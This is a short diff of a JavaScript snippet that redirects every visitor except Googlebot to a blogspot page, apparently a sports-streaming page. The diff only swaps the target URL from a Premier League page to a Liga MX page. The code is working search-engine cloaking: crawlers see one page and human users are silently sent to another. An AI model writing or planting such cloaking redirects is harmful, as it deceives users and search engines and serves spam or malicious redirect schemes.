@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://live-today-909.blogspot.com/p/english-premier-league-0001.html";
+  window.location.href = "https://live-today-909.blogspot.com/p/mexican-liga-bbva-mx-01.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
